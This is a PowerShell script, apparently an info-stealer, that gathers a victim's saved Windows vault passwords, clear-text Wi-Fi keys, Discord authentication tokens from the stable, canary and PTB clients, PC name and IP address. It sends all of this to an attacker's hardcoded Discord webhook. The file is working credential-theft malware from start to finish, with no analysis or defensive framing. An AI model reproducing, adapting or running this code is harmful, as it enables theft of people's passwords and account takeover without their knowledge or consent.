$hookUrl = 'https://discord.com/api/webhooks/940023056338944041/h2vgzH4bzl0l6fLANvrr6Cc8a_3NTtzM1-Pk1vgzWeGmkbpzDXUSgQCF2SllVRgn4mUa'

[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$cachedPasswords = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | Format-Table -HideTableHeaders | Out-String

$wifiData = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String 
$Body = @{
  'username' = 'Tokens: '
  'content' = $wifiData + $cachedPasswords
}
Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body

# http://f1sk.xyz // http://jayy.xyz 
# <3
$id=""
$tmpID=""
$user=""
$tmpTag=""
$possibleTokens = @()
$discordPath = $env:APPDATA+"\discord"
$storagePath = "\Local Storage\leveldb"
$stable = $discordPath+$storagePath
$canary = $discordPath+"canary"+$storagePath
$ptb = $discordPath+"ptb"+$storagePath
if ( Test-Path -LiteralPath $stable ) {
    Set-Location $stable
    $files = @(Get-ChildItem *.ldb)
    Foreach ($file in $files)
    {
                $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
        if ($mfa.length -gt 1) {
            try {
                $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue
            } catch {
                # $_.Exception.Response.StatusCode.Value__
            }
            }
            if ($r.statusCode -eq "200") 
            {
                $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                $id = $tmpID.id
                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="";Token=$mfa;User=$id;ID=$user})
            } else {
            }
            $id=""
            $tmpID=""
            $user=""
            $r=""
            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
            if ($tkn.length -gt 2) {
                try {
                    $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                    -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue
                } catch {
                     # $_.Exception.Response.StatusCode.Value__
            }
                }
                if ($r.statusCode -eq "200")
                {
                    $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                    $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                    $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                    $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                    $id = $tmpID.id
                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="";Token=$tkn;User=$id;ID=$user})
                    $r=""
                    $id=""
                    $tmpID=""
                    $user=""
                } else {
                    $r=""
                    $id=""
                    $tmpID=""
                    $user=""
                }
}
}
if ( Test-Path -LiteralPath $canary ) {
    Set-Location $canary
    $files = @(Get-ChildItem *.ldb)
    Foreach ($file in $files)
    {
        $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
        if ($mfa.length -gt 1) {
            try {
                $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue
            } catch {
                 # $_.Exception.Response.StatusCode.Value__
            }
            }
            if ($r.statusCode -eq "200")
            {
                $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                $id = $tmpID.id
                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="";Token=$mfa;User=$id;ID=$user})
                $r=""
                $id=""
                $tmpID=""
                $user=""
            } else {
                $r=""
                $id=""
                $tmpID=""
                $user=""
            }
            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
            if ($tkn.length -gt 2) {
                try {
                    $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                    -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue
                } catch {
                     # $_.Exception.Response.StatusCode.Value__
            }
                }
                if ($r.statusCode -eq "200")
                {
                    $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                    $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                    $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                    $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                    $id = $tmpID.id
                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="";Token=$tkn;User=$id;ID=$user})
                    $id=""
                    $r=""
                    $tmpID=""
                    $user=""
                } else {
                    $id = ""
                }
}
}
if ( Test-Path -LiteralPath $ptb ) {
    Set-Location $ptb
    $files = @(Get-ChildItem *.ldb)
    Foreach ($file in $files)
    {
        $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
        if ($mfa.length -gt 1) {
            try {
                $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue
            } catch {
                 # $_.Exception.Response.StatusCode.Value__
            }
            }
            if ($r.statusCode -eq "200")
            {
                $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                $id = $tmpID.id
                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="";Token=$mfa;User=$id;ID=$user})
                $r=""
                $id=""
                $tmpID=""
                $user=""
            } else {
                $r=""
                $id=""
                $tmpID=""
                $user=""
            }
            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
            if ($tkn.length -gt 2) {
                try {
                    $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                    -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue 
                } catch {
                     # $_.Exception.Response.StatusCode.Value__
            }
                }
                if ($r.statusCode -eq "200")
                {
                    $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                    $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                    $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                    $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                    $id = $tmpID.id
                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="";Token=$tkn;User=$id;ID=$user})
                    $id=""
                    $r=""
                    $tmpID=""
                    $user=""
                } else {
                    $id = ""
                }
}
}
$id=""
$tmpID=""
$user=""
$tmpTag=""

$Body = @{
  'username' = 'Tokens: '
  'content' = $possibleTokens | Format-Table -HideTableHeaders | Out-String
}
Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body

Add-Type -AssemblyName System.Windows.Forms
$ip=get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
$ipaddress = $ip.ipaddress[0]
$pcname = [System.Net.Dns]::GetHostName()

$Body = @{
    'username' = 'Tokens: '
    'content' = "My PC name - $pcname `n`nMy IP address - $ipaddress"
  }
  Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
